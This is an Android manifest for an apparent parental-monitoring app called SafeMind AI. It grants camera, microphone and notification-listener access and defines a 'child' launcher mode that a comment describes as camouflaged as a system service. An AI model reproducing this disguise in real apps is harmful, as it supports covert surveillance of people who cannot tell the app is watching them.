<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    
    <application
      android:name=".MainApplication"
      android:label="@string/app_name_tutor"
      android:icon="@mipmap/ic_launcher"
      android:roundIcon="@mipmap/ic_launcher_round"
      android:allowBackup="false"
      android:theme="@style/AppTheme"
      android:usesCleartextTraffic="true">
      
      <!-- Excluir InitializationProvider problemático -->
      <provider
        android:name="androidx.startup.InitializationProvider"
        android:authorities="${applicationId}.androidx-startup"
        tools:node="remove" />
      
      <!-- Actividad principal (sin ícono directo en launcher) -->
      <activity
        android:name=".MainActivity"
        android:label="@string/app_name_tutor"
        android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
        android:launchMode="singleTask"
        android:windowSoftInputMode="adjustResize"
        android:exported="true">
      </activity>

      <!-- Alias para modo TUTOR (normal, con ícono y nombre de SafeMind AI) -->
      <activity-alias
        android:name=".TutorLauncher"
        android:targetActivity=".MainActivity"
        android:label="@string/app_name_tutor"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:enabled="true"
        android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
      </activity-alias>

      <!-- Alias para modo HIJO (camuflado como servicio del sistema) -->
      <activity-alias
        android:name=".ChildLauncher"
        android:targetActivity=".MainActivity"
        android:label="@string/app_name_child"
        android:icon="@drawable/ic_launcher_system"
        android:roundIcon="@drawable/ic_launcher_system"
        android:enabled="false"
        android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
      </activity-alias>

      <service
        android:name=".NotificationService"
        android:label="@string/app_name_tutor"
        android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
        android:exported="true">
        <intent-filter>
            <action android:name="android.service.notification.NotificationListenerService" />
        </intent-filter>
      </service>

    </application>
</manifest>
